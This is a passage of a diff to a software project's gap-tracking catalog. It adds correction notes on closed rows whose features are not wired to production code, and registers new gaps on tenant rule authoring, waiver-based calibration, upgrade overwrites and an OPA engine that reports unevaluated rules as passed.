@@ -170,6 +170,8 @@ This catalog explains each gap: problem, purpose, evidence, closure criteria, an
 - **Progress (2026-07-13, Wave 6, commit `41135566`):** Landed at the core-domain seam (reuses `sarif-exporter`/`EvidenceNormalizer`, Core stays pure — live Checks API behind a port). core-domain 1018/1018 + CLI evaluate 6/6 green. Kept `IN-PROGRESS`: the live Checks-API publish, a durable waiver store, and the CLI waiver subcommand are the deploy/polish remainders.
 - **Status:** `DONE`
 
+**CORRECTION 2026-08-14 — both halves were built and never wired to each other.** `evaluateDriftGate` implements full waiver suppression behind an optional `waivers?: IWaiverStore` parameter, and all three production call sites omit it (`evaluate.command.ts:174`, `evaluate.command.ts:204`, `mcp-server/src/tools/evaluate.tool.ts:138`); `FileWaiverStore` has exactly one non-spec consumer, the command that WRITES waivers. Measured end to end: approving a waiver and re-running the drift gate leaves `blockingFailures 94 → 94`, `frozen 0 → 0`, `waiverRef undefined`. This row's closure record stands as history; the live defect is registered as [`GT-677`](./gap-reference-catalog.md#gt-677).
+
 #### GT-519
 
 **Title:** CLI/MCP/REST parity (BR-008) + reproducible toolchain + enforcer observability
@@ -2705,6 +2707,8 @@ Discovered by the **ADR-0109 Phase-0b spike** while validating the prospective m
   - [x] Audit events persist to an append-only store.
   - [x] Queryable by tenant/phase/actor/correlationId.
 
+**CORRECTION 2026-08-14 — this row was closed against a class with no production instantiation.** `grep -rn "JsonlAuditRepository" src .harness` returns exactly two hits: its own declaration and a prose comment in `jsonl-transparency-ledger.ts`. Zero imports, zero DI registrations, and `new AuditService(...)` only in specs — so the ticked criteria "audit events persist to an append-only store" and "queryable by tenant/phase/actor/correlationId" are not satisfied by any reachable code path. Registered as [`GT-680`](./gap-reference-catalog.md#gt-680) rather than reopened, because `08-validate-tracking` treats a closure record on a non-DONE row as an error and unwinding it would destroy the evidence trail.
+
 #### GT-322
 
 **Title:** Typed @evolith/sdk client (REST+MCP)
@@ -2865,6 +2869,8 @@ Discovered by the **ADR-0109 Phase-0b spike** while validating the prospective m
   - [x] An ABAC policy in OPA (`abac-mcp-tool-access.rego`) gates mutative tools by caller role/scope, deny by default.
   - [x] Audit events record caller identity, scope, approval token, and diff for every mutative tool invocation.
 
+
+**CORRECTION 2026-08-14 — nothing issues an `approvalToken`.** The ticked criterion names a token "issued out-of-band"; the entire predicate at `mcp-tool-dispatch.ts:232` is `typeof approvalToken === 'string' && trim() !== ''`, and a grep for `issueApproval`, `redeemApproval`, `mintApproval` and `createApprovalToken` across `src` returns nothing outside doc comments and fixtures. Registered as [`GT-679`](./gap-reference-catalog.md#gt-679).
 
 #### GT-159
 
@@ -4978,6 +4984,8 @@ Historical gap series tracked in the former `gap-analysis-core.md`, preserved fo
   - [x] Correlation IDs propagate from HTTP headers/Stdio metadata into OTel spans and audit logs.
   - [x] Integration tests assert audit event emission for at least one tool, resource, and prompt path.
 
+**CORRECTION 2026-08-14 — the resource and prompt half of the ticked criterion has no production caller.** `logResourceAccess` and `logPromptAccess` are defined at `audit-logger.ts:72,77` and their only callers in the entire tree are `mcp-server.service.spec.ts:709,724` — the supporting tests call the logger directly, which is why "emits structured events for every tool/resource/prompt call across both transports" reads as satisfied. Tracked in [`GT-680`](./gap-reference-catalog.md#gt-680) criterion 2.
+
 #### GT-222
 
 **Purpose:** Bring per-topology OPA test density up to ≥1 test per rule so the parity gate is meaningful — today modular-monolith has 2 tests for 12 rules (17%), distributed-modules has 4 for 8 (50%), and agentic-ai has 4 for 9 (44%), all far below the 100%+ density of data-mesh and event-driven.
@@ -5397,6 +5405,8 @@ Historical gap series tracked in the former `gap-analysis-core.md`, preserved fo
   - [x] Revocation endpoint or mechanism documented.
   - [x] Audit log for key creation, rotation, and revocation events.
   - [x] Migration path documented from the current single-env-var model to the provisioning service.
+
+**CORRECTION 2026-08-14 — the provisioning service has no call site.** `grep -rn "ApiKeyProvisioningService" src` returns only its own file, its spec, README prose and `mcp.module.ts:9,14,15` where it is registered as a provider and exported. The ticked criteria "a CLI command or HTTP endpoint generates keys on demand", "rotation without restart" and "revocation documented" are not reachable: the only routes are `/health*`, `/metrics` and `/.well-known/oauth-protected-resource`, and the key store is an in-process `Map`. Registered as [`GT-681`](./gap-reference-catalog.md#gt-681).
 
 #### GT-267
 
@@ -8949,3 +8959,495 @@ The declaration has one hole — a pack that does not declare — and the direct
 **Measured after.** `node --test` on the reworked file: **20 cases, 20 pass, 0 fail, 0 skipped** (19 before, all passing except the counting case). `42-validate-guard-denominators`: 78 guards classified, 57/57 scanners refuse a zero-element scan. `43-validate-guard-negative-fixtures`: 54/54 exercised guards turned red on the empty fixture. **No corpus file, no generator and no derived artifact was touched** — this row changes a test and adds a fixture, which is also why it does not collide with the concurrent `analyser.adoptable` work on `build-iso-5055-mapping.mjs` and `iso-5055-mapping.json`.
 
 **What is NOT claimed.** The frozen fixture pins the pre-fix side of the comparison; the live side is still read from the repository, so the counts here hold as long as the three standards packs keep their 16 rules. That is asserted elsewhere in the same file (`their rules … 16`) and is deliberately not duplicated as a second denominator. This row also does not re-audit the other 64 guard self-tests for the same moving-ref pattern; whether `git show` against a branch appears anywhere else was not measured.
+
+
+#### GT-669
+
+**Title:** A recurring finding has no path to a tenant-authored deterministic rule, so the ratchet is our private practice and not the product's capability
+
+- **Purpose:** Give a tenant the loop this repository runs on itself — a finding that keeps recurring becomes a deterministic, verifiable rule in *their* corpus — through a supported surface instead of a fork.
+- **Evidence:** This repository ratchets its own findings into guards: **112 files under `.harness/scripts/ci/`**, hand-written `.mjs`, each traceable to the board row that produced it. **None of that loop is reachable by a tenant.** The only rule-facing CLI surface is `evolith rulesets`, and its own declared description is *"List the ruleset packs this Core can evaluate, with the refs `validate --select` accepts"* (`rulesets.command.ts:39-40`) — read-only, 138 lines, with no author, validate or publish path. The corpus lives in `src/rulesets/**` inside the Core repository, and `evolith upgrade` copies core rulesets **into** the satellite (`satellite-upgrade-apply.ts:5-15`), so the only way a tenant adds a rule today is to edit a file the next upgrade overwrites — which is [`GT-673`](./gap-reference-catalog.md#gt-673), registered separately because it is a defect of `upgrade` and this is an absent capability. Benchmarked 2026-08-14 against The Agile Monkeys' **Facility** (`sdlc.theagilemonkeys.com`, `github.com/theam/Facility`), which ships this loop as a headline capability — repeated review feedback graduated into a deterministic check. Their guards are zero-dependency executable scripts; ours is compiled policy with a wasm runtime and a builtin oracle ([`GT-644`](./gap-reference-catalog.md#gt-644)). **The asset is on our side and the path to the tenant is not.**
+- **Use cases:**
+  - A tenant's reviewers keep flagging the same thing across pull requests; a lead wants it enforced from tomorrow without waiting for an Evolith release.
+  - A regulated tenant must add a control from its own internal standard and prove it is decided deterministically rather than by a model.
+  - The same mechanism from our end: a finding registered on this board becomes a rule shipped to every tenant that opted into that pack.
+  - An LLM proposes a candidate rule from a cluster of similar findings; the tenant reviews it and the verifier decides — the neuro-symbolic thesis as a product feature rather than an internal habit.
+- **Impact:** This is the loop that lets the corpus grow at the tenant's rate instead of ours, and it is the productised form of *the model proposes, the verifier decides*. Without it, "the client selects its level" holds only for packs we authored, and the ratchet — the single practice a competitor's landing page sells hardest — stays invisible outside this repository.
+- **Expected outcome:** A tenant can take a recurring finding to an authored rule, evaluated by the same engine as the shipped corpus, and keep it across upgrades — with the rule's origin (the findings that motivated it) recorded on the rule itself.
+- **Affected files:** `src/sdk/cli/src/commands/rulesets/rulesets.command.ts`, `src/packages/core-domain/src/application/upgrade/**`, `src/rulesets/**`, `src/packages/mcp-server/src/**`
+- **Component:** `Governance` · **Criticality:** P1 · **Complexity:** L
+- **Principal:** `L` · **Interest:** `HIGH` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from an owner-requested competitive benchmark of `https://sdlc.theagilemonkeys.com/` and `github.com/theam/Facility`. **Every absence claimed in this wave was measured against this repository before registration, and two candidate rows did NOT survive that check and are deliberately absent:** a "no calibration instrument" row (refuted — `evolith calibrate report` ships a confusion matrix, false-block rate, Wilson interval and κ, [`GT-585`](./gap-reference-catalog.md#gt-585) criterion 2), and a "no observability connector" row (refuted — `LangfuseEvidenceAdapter` exists and is exported; what is actually missing is narrower and is registered as [`GT-674`](./gap-reference-catalog.md#gt-674)).
+- **Acceptance criteria:**
+  - [ ] A tenant can author a rule through a supported surface (CLI at minimum) and have it evaluated by the same engine as the shipped corpus, without editing files under the Core's `src/rulesets/`.
+  - [ ] An authored rule is validated against the ruleset schema and REJECTED with a diagnostic when it is malformed, rather than being skipped at load time — the silent-skip failure of [`GT-649`](./gap-reference-catalog.md#gt-649).
+  - [ ] An authored rule survives `evolith upgrade` (depends on [`GT-673`](./gap-reference-catalog.md#gt-673)) and is proven to survive by a test that upgrades and re-evaluates.
+  - [ ] The rule carries its provenance — what recurring finding motivated it, and who approved it — so a ratchet entry is auditable rather than folklore.
+  - [ ] A negative test proves an authored rule can actually FAIL a subject; a rule that only ever passes is the vacuous case this board keeps finding.
+- **Status:** `PENDING`
+
+**SCOPE CORRECTION 2026-08-14, from the ultracode benchmark wave — one claim in this row was REFUTED and the residue is narrower than registered.** A rule authored entirely outside the Core repository CAN execute today, on two production-wired paths, with no Core code change, and both were run: (1) a novel-id rule `ACME-04` with `category: "boundary"` and an authored clause returned a real `failed` verdict through `NativeEvaluator`, because `ModuleBoundaryRuleHandler.canHandle` claims by CLAUSE and not by id (`:35-42`), as do the ADR-conformance and architecture handlers; (2) a novel-id rule with `enforce: {engine: 'enforcer', tool: 'Trivy'}` returned `failed | 1 violation(s) from Trivy`, because `enforce` blocks are normalized since `GT-632` and all three surfaces inject a process runner. **What actually survives, and what this row now scopes:** a tenant cannot register a new EXECUTOR — `createEnforcerAdapters` is a fixed six-entry factory (`enforcer-subsystem.ts:40-53`) with no injection point, and three grep spellings for a registration hook found nothing outside specs — and there is no tenant-facing documentation of the two paths that already work. Criterion 1 stands as written; the honest headline is the absence of a SUPPORTED, DOCUMENTED authoring surface and of executor extensibility, not an inability to execute.
+
+#### GT-670
+
+**Title:** The one organic adjudication the product already captures — an approved waiver — is never turned into the calibration label that instrument is waiting for
+
+- **Purpose:** Feed `evolith calibrate report` from data the product already collects, so a per-rule false-block rate becomes derivable instead of waiting on a hand-labelled corpus.
+- **Evidence:** `evolith waiver` records the `correlationId` of the verdict being waived (`waiver.command.ts:229`), and the domain `Waiver` carries the `fingerprint` of the suppressed violation, the `reason`, `requestedBy`, `approvedBy`, `approvedAt` and a hard `expiresAt` (`domain/waiver.ts:29-48`), with a `FileWaiverStore` persisting them. **An APPROVED waiver is a human deciding that a blocking violation should not have blocked** — which is exactly `humanBlocked: false` for that rule on that subject, the label `evolith calibrate report` consumes (`{ subject, rulesetId, gateBlocked, humanBlocked }`, `calibrate.command.ts:56`). Nothing connects the two: `grep -rn "waiver" src/sdk/cli/src/commands/calibrate/` returns **no matches**. [`GT-585`](./gap-reference-catalog.md#gt-585) records its blocker as "no organic label corpus until something runs in production" and is DEFERRED on it; **this row is the channel, not a second instrument** — the waiver ledger IS an organic corpus, it is already flowing wherever gates run, and nothing reads it. Benchmarked 2026-08-14 against Facility, whose watchtower joins each run receipt to its eventual outcome; the join is the part we lack, and waivers are the join we already own.
+- **Use cases:**
+  - A tenant approves twelve waivers on the same rule in a month; the board should read that as a candidate false-block rate for that rule, not as twelve unrelated exceptions.
+  - Evolith publishes a per-ruleset precision figure ([`GT-585`](./gap-reference-catalog.md#gt-585) criterion 3) from data it already holds, rather than from a set somebody labelled by hand.
+  - A rule whose waiver rate crosses a threshold is proposed for demotion from `blocking` to `advisory` — an argument backed by the tenant's own decisions instead of our opinion.
+  - An auditor asks how often the gate is wrong and receives a rate with its denominator and interval, per rule.
+- **Impact:** "Our gates have a measured false-block rate, per rule and per tenant" is the claim a competing rule catalogue cannot copy, because it is a property of accumulated operation. Today that claim is blocked on labels while the label source sits unread in the waiver store.
+- **Expected outcome:** A calibration corpus that grows on its own as gates are operated, and a per-rule false-block rate that is derived rather than retrofitted.
+- **Affected files:** `src/packages/infra-providers/src/file-waiver-store.provider.ts`, `src/packages/core-domain/src/domain/waiver.ts`, `src/packages/core-domain/src/domain/calibration/**`, `src/sdk/cli/src/commands/calibrate/**`
+- **Component:** `Governance` · **Criticality:** P1 · **Complexity:** M
+- **Principal:** `M` · **Interest:** `MED` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the same benchmark as [`GT-669`](./gap-reference-catalog.md#gt-669), and narrowed by measurement: the first formulation was "nothing measures whether a gate was right", which is REFUTED by `evolith calibrate report`. What survived is the missing input channel, which is why this row cross-references [`GT-585`](./gap-reference-catalog.md#gt-585) instead of restating it.
+- **Acceptance criteria:**
+  - [ ] An exporter turns approved waivers into calibration labels (`subject`, `rulesetId`, `gateBlocked: true`, `humanBlocked: false`), carrying the waiver `fingerprint` and `approvedAt` as provenance.
+  - [ ] A REJECTED waiver is exported as `humanBlocked: true` — without the confirming label the corpus contains only disagreement and every rate reads 100 %.
+  - [ ] Waivers that expired without adjudication are EXCLUDED and counted separately, so silence is never read as agreement.
+  - [ ] `evolith calibrate report` runs end to end on the exported corpus in a test, and still refuses to quote a rate below its declared n floor.
+  - [ ] The exporter is proven falsifiable: a corpus with a known planted disagreement produces the expected matrix, and removing the planted row changes it.
+- **Status:** `PENDING`
+
+#### GT-671
+
+**Title:** Nothing re-verifies the published artifact after the day it is published, and the one post-publish check is `--help`
+
+- **Purpose:** Detect a break in what users actually install, on a schedule, instead of learning about it from a user.
+- **Evidence:** `sdk-cli-release.yml` is the **only** workflow that installs from the registry — `npm install -g @beyondnet/evolith-cli@<version>` followed by `evolith-cli --help` (`sdk-cli-release.yml:328-332`). The functional smoke immediately above it runs `init` against the packaged **binary** downloaded from build artifacts, not against the npm install (`:317-325`), so no run exercises a registry install doing real work. Both run once, inside the release. **Exactly two workflows in the repository carry a `schedule:`** — `opa-parity.yml` and `openssf-scorecard.yml` — so nothing periodic touches the published artifact at all. **The class is not hypothetical and has already cost twice:** [`GT-634`](./gap-reference-catalog.md#gt-634) is a defect of the PUBLISHED CLI that appeared after publication (a `^1.1.0` range that cannot cross a major, resolving `latest` onto a pre-wave SDK) and was found by hand while doing something else; and [`GT-625`](./gap-reference-catalog.md#gt-625)'s own closure record states its criterion is ticked against "a locally packed tarball, not against the registry". Benchmarked 2026-08-14 against Facility's weekly synthetic canary, which runs an end-to-end delivery loop on a schedule for precisely this reason.
+- **Use cases:**
+  - A transitive dependency republishes or a range resolves differently, and the installed CLI breaks for every new user while the repository stays green.
+  - Before pointing a prospect at `npm install`, the team wants a dated green run proving the published artifact does real work.
+  - A package the CLI depends on is deprecated or unpublished upstream — a `--help` never notices.
+  - A registry-side regression is separated from a source-side one, because the canary tests the artifact and CI tests the tree.
+- **Impact:** Every check in this repository measures the tree; the thing customers touch is the tarball. That asymmetry is the [`GT-625`](./gap-reference-catalog.md#gt-625) class, and it is the difference between an installable product and a repository that builds.
+- **Expected outcome:** A scheduled run that fails loudly the day the published artifact stops working, with the failure attributable to the registry rather than to the branch.
+- **Affected files:** `.github/workflows/**` (new scheduled canary), `src/sdk/cli/examples/gate-verdict.assert.js`, `src/sdk/cli/package.json`
+- **Component:** `Infra` · **Criticality:** P1 · **Complexity:** S
+- **Principal:** `S` · **Interest:** `HIGH` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the same benchmark as [`GT-669`](./gap-reference-catalog.md#gt-669). The claim "there is no post-publish check" was measured and is FALSE — one exists — so this row is scoped to what the existing check cannot see: a single `--help` at release time, never repeated.
+- **Acceptance criteria:**
+  - [ ] A scheduled workflow installs `@beyondnet/evolith-cli@latest` from the registry in a clean container with no repository checkout on the resolution path, and runs `init` then `validate`.
+  - [ ] The assertion is a real ADR-0073 envelope with a verdict, not a zero exit code — the weak-oracle failure recorded in [`GT-625`](./gap-reference-catalog.md#gt-625).
+  - [ ] The same run exercises `@beyondnet/evolith-mcp@latest` over stdio and asserts a real gate verdict, reusing `gate-verdict.assert.js` rather than a second oracle.
+  - [ ] A red canary surfaces somewhere a human reads; a permanently red scheduled workflow is the failure mode [`GT-635`](./gap-reference-catalog.md#gt-635) records.
+  - [ ] Proven falsifiable: run against a version known to be broken (`cli@1.2.0`, [`GT-625`](./gap-reference-catalog.md#gt-625)) and OBSERVED red, not argued to be.
+- **Status:** `PENDING`
+
+#### GT-672
+
+**Title:** Every figure that would make the governance claim checkable is derived and committed, and none of it is published where a reader can see it
+
+- **Purpose:** Publish the measurements this repository already produces, derived from committed artifacts, so the claim "governed, measured" can be checked by someone who does not trust us.
+- **Evidence:** The measurements exist and are already kept honest: `gap-tracking.md` carries 666 rows with statuses and debt economics ([`GT-599`](./gap-reference-catalog.md#gt-599)), the maturity reconciliation and executive summary are generated artifacts, `iso-5055-mapping.json` publishes rule classification with denominators, the guard corpus is classified and its negative fixtures counted (78 classified, 54 observed failing), and `46-validate-derived-artifact-order` holds the whole chain at a fixed point. **What ships publicly is documentation** — `docs.yml` and `docs-release.yml` publish to `gh-pages` — and none of these figures with it. Benchmarked 2026-08-14 against Facility, whose landing page *is* its dashboard (acceptance rate per agent lane, reverts, time to merge) and is the single most transferable asset it has. **The benchmark also supplies the anti-pattern, measured the same day:** that page currently renders `0 deterministic guards recorded` and `0h median` — placeholders where the derivation is not wired — so the lesson taken is the opposite of imitation: publish only figures derived from a committed artifact, each with its denominator, and fail the generator when a source is missing rather than rendering a zero.
+- **Use cases:**
+  - A prospect asks why the gates should be trusted and gets a dated page with denominators instead of a sales claim.
+  - The owner sees drift — open P0s, guards observed failing, maturity level — without opening the repository.
+  - A per-rule precision figure ([`GT-585`](./gap-reference-catalog.md#gt-585) criterion 3) has somewhere to live once [`GT-670`](./gap-reference-catalog.md#gt-670) produces labels.
+  - An auditor or a partner verifies a claim in the commercial narrative against the artifact it came from.
+- **Impact:** The distance between "we have 112 guards and a signed ledger" and a reader believing it is a published, derived number. This is the cheapest positioning move available because the material is already produced and already guarded.
+- **Expected outcome:** A public page whose every figure names the artifact and commit it was derived from, regenerated in the same chain as the rest of the derived corpus.
+- **Affected files:** `.harness/scripts/ci/**` (new generator + chain link), `.github/workflows/docs.yml`, `reference/core/control-center/**`
+- **Component:** `Governance` · **Criticality:** P2 · **Complexity:** M
+- **Principal:** `M` · **Interest:** `LOW` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the same benchmark as [`GT-669`](./gap-reference-catalog.md#gt-669), including the competitor's own placeholder figures observed on their live page that day — recorded because it is the failure this row must avoid, not as a comparison.
+- **Acceptance criteria:**
+  - [ ] A generator emits the public metrics page from committed artifacts only, with no figure typed by hand.
+  - [ ] Every figure carries its denominator and names the artifact and commit it was derived from.
+  - [ ] A missing or unreadable source artifact FAILS the generator; it never renders as zero.
+  - [ ] The generator is a declared link in the `46-validate-derived-artifact-order` chain, so a stale page is a red check rather than an embarrassment.
+  - [ ] Published through the existing docs pipeline; no new hosting and no new domain.
+- **Status:** `PENDING`
+
+#### GT-673
+
+**Title:** `evolith upgrade` cannot tell a tenant's edit from an upstream change, and overwrites it
+
+- **Purpose:** Make a satellite upgrade safe for a tenant that has customised anything, which is every tenant the moment [`GT-669`](./gap-reference-catalog.md#gt-669) exists.
+- **Evidence:** `diffSatelliteVsCore` compares core file content against satellite file content and emits a `modify` change on **any** difference (`satellite-upgrade-diff.ts:70-81`); `applyChange` then writes the core content over the satellite file unconditionally (`satellite-upgrade-apply.ts:5-15`). **There is no record of what was originally scaffolded** — `grep -nE "hash|checksum|fingerprint|modified|overwrite" src/packages/core-domain/src/application/upgrade/*.ts` returns **nothing** — so "the tenant customised this rule" and "the core changed this rule" are indistinguishable, and the plan the operator approves describes both identically as `Update ruleset: <path>`. `createBackup` bounds the loss to a recoverable copy; it does not prevent the overwrite, and nothing in the plan warns that an edit is about to be discarded. Benchmarked 2026-08-14 against Facility, which fingerprints its installed template, keeps user-editable files in delimited managed blocks, and delivers upgrades as reviewable pull requests rather than in-place writes.
+- **Use cases:**
+  - A tenant tightens a threshold in a scaffolded ruleset; the next upgrade silently restores our value and the tenant's policy is gone from the working tree.
+  - A tenant wants upstream rule updates but must keep three local overrides — today the only safe advice is "never upgrade", which freezes them on an old corpus.
+  - An operator reviewing an upgrade plan needs to see which changes touch files they modified, before approving anything.
+  - A tenant wants to know what they have diverged from upstream, without diffing two repositories by hand.
+- **Impact:** An upgrade that silently reverts tenant policy is worse than no upgrade path: it converts the product's own update mechanism into a governance incident, and it directly contradicts the tenant-configurable principle the corpus is being built around.
+- **Expected outcome:** An upgrade that separates upstream change, local change and genuine conflict, applies the first, preserves the second, and refuses the third without an explicit instruction.
+- **Affected files:** `src/packages/core-domain/src/application/upgrade/satellite-upgrade-diff.ts`, `src/packages/core-domain/src/application/upgrade/satellite-upgrade-apply.ts`, `src/packages/core-domain/src/application/services/project-scaffolder.service.ts`, `src/sdk/cli/src/commands/upgrade/upgrade.command.ts`
+- **Component:** `CLI` · **Criticality:** P2 · **Complexity:** M
+- **Principal:** `M` · **Interest:** `MED` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the same benchmark as [`GT-669`](./gap-reference-catalog.md#gt-669). The defect was read out of the two upgrade modules before registration rather than inferred from the competitor's feature list; the absence of any fingerprint was verified by grep and is quoted above. **Not claimed:** whether any tenant has actually lost an edit this way — nothing runs in production yet ([`GT-435`](./gap-reference-catalog.md#gt-435)/[`GT-448`](./gap-reference-catalog.md#gt-448)), so this is a live defect with no recorded victim, and saying otherwise would be inventing an incident.
+- **Acceptance criteria:**
+  - [ ] `init` records a fingerprint of every file it scaffolds — path, content hash and core version — in a committed manifest.
+  - [ ] `upgrade` classifies each change as `upstream-only`, `local-only` or `conflict` against that fingerprint, and reports the three separately in both the human and JSON envelopes.
+  - [ ] A `conflict` is not applied by default; applying one requires an explicit flag and names every file it will overwrite.
+  - [ ] A test scaffolds a satellite, edits a scaffolded file, upgrades, and asserts the edit SURVIVES — observed failing against today's code before the fix.
+  - [ ] The satellite can report its divergence from upstream without performing an upgrade.
+- **Status:** `PENDING`
+
+#### GT-674
+
+**Title:** The AI-execution evidence port and its Langfuse adapter ship with no consumer: no rule reads cost or tokens, and no surface can supply a trace
+
+- **Purpose:** Either make AI-execution evidence decidable by a governance rule, or delete the port rather than leave an apparent capability.
+- **Evidence:** `ObservabilityEvidence` models trace id, source, model, prompt name and version, `costUsd`, `latencyMs`, `totalTokens`, tool calls and evaluation scores (`domain/observability-evidence.ts:20-35`), and `LangfuseEvidenceAdapter` implements `IObservabilityEvidenceSource` (`infra-providers/src/langfuse-evidence.adapter.ts:26`) and is exported from the package barrel. **Nothing consumes either symbol.** Outside those two files, their specs and `index.ts`, a grep for `LangfuseEvidenceAdapter` and `IObservabilityEvidenceSource` across `src` matches nothing — no rule handler, no DI registration in `core-api` or `mcp-server`, no CLI or MCP input that accepts a trace. So no governance rule can decide anything today about an AI execution's cost, model or prompt version, which is the entire evidence class the port exists to carry. Benchmarked 2026-08-14 against Facility, which gates on exactly this data — per-project budgets enforced at a model gateway, cost and token attribution per agent and task — which is what makes wiring the port worth arguing about rather than deleting it by default.
+- **Use cases:**
+  - A gate refuses a change whose AI execution ran on an unpinned prompt version or an undeclared model.
+  - A tenant caps spend per initiative and wants the cap evaluated as a rule, with the trace as the evidence behind the verdict.
+  - Cost and token counts of an agent run become part of the audit record of an initiative, alongside the signed statements of [`GT-588`](./gap-reference-catalog.md#gt-588).
+  - A tenant on a different observability backend supplies the same portable shape, and the rule does not change.
+- **Impact:** This is the axis where an AI-SDLC competitor is strongest (they meter and budget every run) and where we have the model and no wire. A port with no consumer is also the worst kind of inventory: it reads as a shipped capability in every inventory that counts symbols.
+- **Expected outcome:** Either a shipped rule that fails on a declared condition over AI-execution evidence, with a documented way to supply a trace — or a deleted port, decided explicitly.
+- **Affected files:** `src/packages/core-domain/src/domain/observability-evidence.ts`, `src/packages/infra-providers/src/langfuse-evidence.adapter.ts`, `src/rulesets/**`, `src/apps/core-api/src/**`
+- **Component:** `Core Domain` · **Criticality:** P2 · **Complexity:** S
+- **Principal:** `S` · **Interest:** `LOW` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the same benchmark as [`GT-669`](./gap-reference-catalog.md#gt-669), after the broader candidate row was REFUTED: the first formulation claimed the connector was missing, and the adapter exists and is exported. What survived measurement is the absence of any consumer, which is a different and smaller claim.
+- **Acceptance criteria:**
+  - [ ] At least one shipped rule consumes `ObservabilityEvidence` and FAILS on a declared condition, with a negative test.
+  - [ ] A surface can supply the evidence inline, per `ADR-0101` — the Core stays stateless and reads no filesystem for it.
+  - [ ] The adapter is exercised against a recorded provider payload fixture rather than a hand-built object, so the mapping is proven against a real shape.
+  - [ ] If the wire is judged not worth building, the port and the adapter are DELETED and the decision recorded — an unconsumed port is not left standing as apparent capability.
+- **Status:** `PENDING`
+
+
+#### GT-675
+
+**Title:** The OPA engine reports `passed` for every rule no compiled policy can decide, inverting the verdict against the native engine on the same input
+
+- **Purpose:** Make the two engines an ADR sells as interchangeable actually disagree only about facts, never about whether a rule ran.
+- **Evidence:** **Reproduced first-hand on 2026-08-14, one command each, opposite verdicts on identical input.** `node src/sdk/cli/dist/main.js validate --format json --core . --engine opa --select src/rulesets/security/injection-prevention.rules.json` → **exit 0**, `{status: "passed", rulesChecked: 2, rulesSkipped: 0, issues: 0, blocking: 0}`. The same command with `--engine native` → **exit 2**, `{status: "failed", rulesChecked: 0, rulesSkipped: 2, issues: 2, blocking: 2}`. `grep -rn "SEC-INJ" src/rulesets/opa/` returns nothing: no compiled policy decides those rules at all. **The mechanism is a missing third outcome.** `OpaEvaluator` has no `skipped` anywhere — every rule it is handed either matches a violation (`failed`) or is reported `passed` (`opa-evaluator.ts:169-185`) — while `NativeEvaluator` returns `skipped` with an evaluability reason when no handler claims the rule (`native-evaluator.ts:92-97`), and `rule-evaluation-engine.ts:412-416` turns a `skipped` + `blocking` rule into a blocking issue. Measured over the whole corpus: OPA `rulesChecked 354 / rulesSkipped 0`, native `113 / 241`; **206 rules the native engine skips are reported `passed` by OPA, 147 of them have no id in any non-test `.rego` across the 34 policy files, and 12 of those are `blocking: true`.**
+- **Use cases:**
+  - A tenant adopts a pack with no Rego coverage, runs the OPA engine, and CI reports green over rules nothing evaluated.
+  - A CI job follows `ADR-0041`, which advertises `--engine <native|opa>` for pipelines, picks OPA for speed, and silently disables 147 rules.
+  - An auditor compares two engine runs of the same corpus, gets 52 versus 112 issues, and no field explains the difference.
+  - A policy author deletes a `.rego` file and nothing goes red — the rules it decided become permanent passes.
+- **Impact:** A governance engine answering `passed` where the other answers `failed` with blocking issues is the single worst failure this product can ship, because it is indistinguishable from success. It also inverts the invariant `GT-595` established — `blocking + skipped` must fail — on the engine an accepted ADR points CI at.
+- **Expected outcome:** `OpaEvaluator` returns `skipped` with an evaluability reason for any rule outside its compiled bundle's declared id set, and a CI guard fails when a rule id is `passed` on one engine and `skipped` on the other.
+- **Affected files:** `src/packages/core-domain/src/application/validators/evaluators/opa-evaluator.ts`, `src/packages/core-domain/src/application/validators/evaluators/native-evaluator.ts`, `.harness/scripts/compile-opa-wasm.mjs`, `.harness/scripts/ci/**` (new engine-agreement guard)
+- **Component:** `Core Domain` · **Criticality:** P1 · **Complexity:** M
+- **Principal:** `M` · **Interest:** `HIGH` · **Basis:** `estimate`
+- **Provenance:** Registered 2026-08-14 from the ultracode multi-agent benchmark wave (30 agents, 40 candidates, 16 adversarially verified, 15 survivors, 1 refutation). **Three sub-claims of the original candidate were killed before it reached the board and must not be re-imported:** "a corpus the OPA engine cannot evaluate returns a clean green verdict" is FALSE for the shipped corpus as a whole (`validate --engine opa --core .` → `status: failed`, 52 issues, 31 blocking, exit 2 — the false green is reachable only on a SELECTED pack); "the defect affects CLI, MCP and REST" is FALSE (`grep -rn "engineType" src/packages/mcp-server/src src/apps/core-api/src` → 0 hits: both surfaces accept an `engine` argument and drop it, which is a smaller separate defect recorded in criterion 6); and the candidate's figures were stale. **Not P0 by this board's convention:** the flag is opt-in, defaults to native, and no CI path in this repository runs it — the defect is a wrong verdict, not an outage. **Also measured:** without a compiled `policy.wasm` on disk (it is gitignored, `.gitignore:154-155`) the same evaluator fails EVERY rule instead — both failure modes are wrong, in opposite directions, behind one flag.
+- **Acceptance criteria:**
+  - [ ] `OpaEvaluator` has a third outcome and a unit test asserts `skipped` for a rule id absent from the policy's declared set.
+  - [ ] The compiled bundle can enumerate the rule ids it can decide — a build-time manifest from `compile-opa-wasm.mjs` or a `declared_rule_ids` entrypoint — asserted non-empty and covering every non-test `.rego`.
+  - [ ] **FALSIFIABILITY:** the exact command pair above is OBSERVED flipping from exit 0 / `passed` to exit 2 / `failed` / `rulesSkipped: 2`, with both literal outputs pasted into the closure record. A fix recorded without that observation does not close this row.
+  - [ ] A new guard runs both engines over the corpus, publishes its denominator, refuses a zero-element scan (`42-validate-guard-denominators`) and is observed turning red by `43-validate-guard-negative-fixtures`.
+  - [ ] The measured disagreement — 206 OPA-passed / native-skipped, 147 with no policy at all, 12 of them blocking — goes to 0 / 0 / 0 under the same measurement.
+  - [ ] The `engine` argument accepted at `composable-validate.tool.ts:62` and `composable-validate.controller.ts:78` and consumed nowhere is either wired or removed; accepted-and-ignored is not an end state.
+- **Status:** `PENDING`
+
+#### GT-676
+
+**Title:** The coverage-floor gate cannot be switched on from any surface, so the one guard against mass-skipping is dead on arrival
+
+- **Purpose:** Let an operator say "fail if more than N% of applicable rules did not run" — the guard `GT-569` built and no caller can reach.
